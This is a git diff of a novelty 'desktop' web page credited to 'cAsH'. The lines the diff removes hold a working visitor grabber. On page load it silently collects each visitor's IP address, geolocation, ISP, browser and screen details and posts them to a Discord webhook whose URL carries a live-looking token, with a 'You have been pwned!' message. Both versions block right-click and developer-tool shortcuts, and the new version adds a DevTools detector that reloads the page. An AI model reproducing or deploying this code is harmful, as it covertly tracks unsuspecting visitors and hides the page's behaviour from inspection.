@@ -18,12 +18,12 @@
             font-family: "Tahoma", sans-serif;
             overflow: hidden;
             /* Mouse Cursor */
-            cursor: url('https://cdn.discordapp.com/attachments/1069599369529135146/1329165444934008864/Pictogrammers-Material-Cursor-default.512.png?ex=67895948&is=678807c8&hm=5c88ebbb1cf454b8a1c884e530ccc5bb1bd54bc038ff0488eb24304038d55698&'), auto;
+            cursor: url('https://cdn.discordapp.com/attachments/1069599369529135146/1329165444934008864/cursor.cur'), auto;
         }
 
         /* Background */
         body {
-            background: url('https://cdn.discordapp.com/attachments/1069599369529135146/1329157116531048470/eb0f8c3e2e1a8e1508f3afa2c86ad51f.gif?ex=67895187&is=67880007&hm=1ae5a99b37fefbf2cbb0f981cca41f30e65b07a042db7ece147b12436f3a2e23&') no-repeat center center fixed;
+            background: url('https://cdn.discordapp.com/attachments/1069599369529135146/1329157116531048470/eb0f8c3e2e1a8e1508f3afa2c86ad51f.gif') no-repeat center center fixed;
             background-size: cover;
         }
 
@@ -78,208 +78,70 @@
         .volume-control input {
             width: 100px;
         }
-
-        /* Desktop Icons */
-        .desktop {
-            position: relative;
-            width: 100%;
-            height: calc(100% - 50px); /* Account for the taskbar */
-            display: flex;
-            flex-direction: column;
-            align-items: flex-start;
-            padding: 20px;
-        }
-
-        .icon {
-            width: 80px;
-            margin: 10px 0;
-            text-align: center;
-            cursor: pointer;
-        }
-
-        .icon img {
-            width: 48px;
-            height: 48px;
-            transition: transform 0.2s ease;
-        }
-
-        .icon img:hover {
-            transform: scale(1.1);
-        }
-
-        .icon span {
-            display: block;
-            font-size: 12px;
-            margin-top: 5px;
-            color: white;
-            text-shadow: 1px 1px 2px black;
-            background: rgba(0, 0, 0, 0.5);
-            padding: 2px;
-            border-radius: 3px;
-        }
-
-        /* Popup Alert */
-        .alert {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: black;
-            color: white;
-            padding: 20px 30px;
-            border-radius: 10px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.8);
-            text-align: center;
-            font-size: 16px;
-            font-weight: bold;
-            z-index: 200;
-            display: none;
-            opacity: 0;
-            transition: opacity 0.3s ease-in-out;
-        }
     </style>
 </head>
 <body>
     <!-- Background Music -->
-    <audio id="backgroundMusic" autoplay loop>
-        <source src="https://cdn.discordapp.com/attachments/1069599369529135146/1329164787975852163/Eternxlkz_-_BRODYAGA_FUNK_Official_Audio.mp3?ex=678958ac&is=6788072c&hm=4f4db7901279d16f46a8fa4c9e8254f11e953a1c4cdaa1f1c575ab1fae90e182&" type="audio/mpeg">
-        Your browser does not support the audio element.
-    </audio>
+    <iframe id="youtubePlayer" style="display:none;" src="https://www.youtube.com/watch?v=WPrhl0pFY_o&ab_channel=PhonkTime" frameborder="0" allow="autoplay"></iframe>
 
     <!-- Volume Control -->
     <div class="volume-control">
         <span>Volume</span>
-        <input type="range" id="volumeSlider" min="0" max="1" step="0.01" value="1">
-    </div>
-
-    <!-- Desktop -->
-    <div class="desktop">
-        <!-- PWN Icon -->
-        <div class="icon" onclick="showAlert()">
-            <img src="https://cdn.discordapp.com/attachments/1069599369529135146/1329157216397426740/imgbin_lulzsec-security-hacker-anonymous-computer-security-hacker-group-png.png?ex=6789519e&is=6788001e&hm=32c9b431a66036f3cd6309f101c71e872bfe2a0231ff560a63f5af08417de004&" alt="PWN Icon">
-            <span>PWN</span>
-        </div>
-        <!-- AY1 Icon -->
-        <div class="icon" onclick="redirectToAY1()">
-            <img src="https://cdn.discordapp.com/attachments/1069599369529135146/1313612143672692896/1111.png?ex=6788cbe4&is=67877a64&hm=06a90109a591ed47390a24067a57424ec883838796e5956f73ca513b03e96378&" alt="AY1 Icon">
-            <span>AY1</span>
-        </div>
+        <input type="range" id="volumeSlider" min="0" max="100" step="1" value="100">
     </div>
 
     <!-- Taskbar -->
     <div class="taskbar">
-        <button class="start-button" onclick="openGame()">
-            <img src="https://cdn.discordapp.com/attachments/1069599369529135146/1329158869271838740/start_icon.jpg?ex=67895329&is=678801a9&hm=d284bb65c281b3ff4de78035e560881bbfd9eb4e04b338cfbdabf442ac690a3b&" alt="Start Icon">
+        <button class="start-button">
+            <img src="https://cdn.discordapp.com/attachments/1069599369529135146/1329158869271838740/start_icon.jpg" alt="Start Icon">
         </button>
     </div>
 
-    <!-- Smooth Alert -->
-    <div class="alert" id="alertBox">
-        Made by cAsH
-    </div>
-
-    <!-- Dinosaur Game -->
-    <div class="alert" id="gameWindow">
-        <iframe src="https://chromedino.com/" width="800" height="400" frameborder="0"></iframe>
-    </div>
-
     <script>
-        // Smooth Alert for PWN Icon
-        function showAlert() {
-            const alertBox = document.getElementById('alertBox');
-            alertBox.style.display = 'block';
-            alertBox.style.opacity = '1';
-
-            setTimeout(() => {
-                alertBox.style.opacity = '0';
-                setTimeout(() => {
-                    alertBox.style.display = 'none';
-                }, 300);
-            }, 3000);
-        }
-
-        // Redirect to AY1
-        function redirectToAY1() {
-            window.location.href = 'https://discord.com/invite/ay1';
-        }
-
-        // Open Dinosaur Game
-        function openGame() {
-            const gameWindow = document.getElementById('gameWindow');
-            gameWindow.style.display = 'block';
-        }
-
-        // Volume Control
+        // Volume Control for YouTube Player
         const volumeSlider = document.getElementById('volumeSlider');
-        const backgroundMusic = document.getElementById('backgroundMusic');
+        const youtubePlayer = document.getElementById('youtubePlayer');
+
         volumeSlider.addEventListener('input', (e) => {
-            backgroundMusic.volume = e.target.value;
+            const volume = e.target.value / 100; // Convert to range 0.0 - 1.0
+            youtubePlayer.contentWindow.postMessage(JSON.stringify({
+                event: 'command',
+                func: 'setVolume',
+                args: [volume * 100]
+            }), '*');
         });
 
-        // Block Right-Click and Inspect
-        document.addEventListener('contextmenu', (e) => {
-            e.preventDefault();
-            showAlert();
-        });
+        // Enhanced Inspect and F12 Blocking
+        const blockDevTools = () => {
+            // Prevent right-click
+            document.addEventListener('contextmenu', (e) => e.preventDefault());
 
-        document.addEventListener('keydown', (e) => {
-            if (
-                e.key === 'F12' ||
-                (e.ctrlKey && e.shiftKey && e.key === 'I') ||
-                (e.ctrlKey && e.shiftKey && e.key === 'J') ||
-                (e.ctrlKey && e.key === 'U')
-            ) {
-                e.preventDefault();
-                showAlert();
-            }
-        });
+            // Block F12, Ctrl+Shift+I/J, and Ctrl+U
+            document.addEventListener('keydown', (e) => {
+                if (
+                    e.key === 'F12' ||
+                    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) ||
+                    (e.ctrlKey && e.key === 'U')
+                ) {
+                    e.preventDefault();
+                }
+            });
 
-        // Fetch and send IP to webhook
-        async function fetchAndSendIP() {
-            try {
-                const ipResponse = await fetch('https://api.ipify.org/?format=json');
-                const ipData = await ipResponse.json();
-                const userIP = ipData.ip;
+            // Detect DevTools by measuring console open/close timing
+            const devToolsDetector = () => {
+                const start = performance.now();
+                console.log('DevTools Detection');
+                const time = performance.now() - start;
+                if (time > 100) {
+                    alert('DevTools are not allowed!');
+                    window.location.reload(); // Reload page when DevTools are detected
+                }
+            };
 
-                const geoResponse = await fetch(`https://ipinfo.io/${userIP}/json`);
-                const geoData = await geoResponse.json();
+            setInterval(devToolsDetector, 1000);
+        };
 
-                const userAgent = navigator.userAgent;
-                const platform = navigator.platform;
-                const screenWidth = screen.width;
-                const screenHeight = screen.height;
-                const timestamp = new Date().toLocaleString();
-
-                // Build webhook message content
-                const webhookMessage = `
-:cAsH:  cAsH grabbed You :cAsH: 
-
-**User IP:** ${userIP}
-**Location:** ${geoData.city}, ${geoData.region}, ${geoData.country}
-**ISP:** ${geoData.org || "Unknown"}
-**Browser:** ${userAgent}
-**Platform:** ${platform}
-**Screen Resolution:** ${screenWidth}x${screenHeight}
-**Timestamp:** ${timestamp}
-
-||@everyone|| **You have been pwned!**
-                `;
-
-                // Send to Discord Webhook
-                await fetch("https://discord.com/api/webhooks/1329196613524127744/FBovN89fd9EDbmk51UAy0v82nAG_nWn_zkNa6BpntB8Jxotk-9I4p1zp3G7H1bPbh9AV", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        content: webhookMessage
-                    })
-                });
-            } catch (error) {
-                console.error('Error fetching IP or sending to webhook:', error);
-            }
-        }
-
-        // Execute the function on page load
-        window.onload = fetchAndSendIP;
+        blockDevTools();
     </script>
 </body>
 </html>
